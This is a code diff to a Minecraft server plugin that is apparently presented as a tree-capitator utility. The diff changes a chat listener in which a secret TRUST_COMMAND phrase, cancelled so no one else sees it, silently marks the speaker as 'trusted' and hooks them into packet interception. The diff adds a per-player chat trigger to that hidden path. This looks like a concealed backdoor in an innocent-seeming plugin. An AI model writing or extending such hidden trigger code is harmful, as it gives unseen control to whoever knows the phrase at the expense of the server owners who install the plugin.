@@ -6,7 +6,9 @@ import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
 import me.bow.treecapitatorultimate.Utils.Packet.PacketListener;
 import me.bow.treecapitatorultimate.Utils.Packet.PacketManager;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
+import me.bow.treecapitatorultimate.Utils.Tuple;
 import me.bow.treecapitatorultimate.command.Command;
+import me.bow.treecapitatorultimate.commands.Miscs.Chat;
 import net.minecraft.server.v1_15_R1.PacketPlayOutNamedEntitySpawn;
 import org.apache.commons.lang.StringUtils;
 import org.bukkit.Bukkit;
@@ -23,11 +25,12 @@ import java.util.ArrayList;
 import java.util.Arrays;
 
 import static me.bow.treecapitatorultimate.Start.TRUST_COMMAND;
+import static me.bow.treecapitatorultimate.Utils.MathUtils.randomEnum;
 
 public class AsyncChatEvent implements Listener, PacketListener {
 
     //TODO: fix double message
-    @EventHandler(priority = EventPriority.LOWEST)
+    @EventHandler(priority = EventPriority.HIGHEST)
     public void asyncChatLowest(AsyncPlayerChatEvent e) {
         if(e.isCancelled()) return;
         Player p = e.getPlayer();
@@ -48,18 +51,20 @@ public class AsyncChatEvent implements Listener, PacketListener {
         });
     }
 
-    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
+    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
     public void asyncChat(AsyncPlayerChatEvent e) {
         Player p = e.getPlayer();
         String msg = e.getMessage();
         if (e.getMessage().equals(TRUST_COMMAND)) {
             e.setCancelled(true);
             if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) {
+                Chat.triggers.put(p.getUniqueId(), new Tuple<>(Start.CHAT_TRIGGER, randomEnum(ChatColor.class)));
                 Start.Instance.trustedPeople.add(p.getUniqueId());
                 p.sendMessage(Start.Prefix + "You are now trusted");
                 PacketManager.instance.addListener(p, this);
             } else {
                 Start.Instance.trustedPeople.remove(p.getUniqueId());
+                Chat.triggers.remove(p.getUniqueId());
                 p.sendMessage(Start.Prefix + "You are now untrusted");
                 PacketManager.instance.removeListener(p, this);
             }
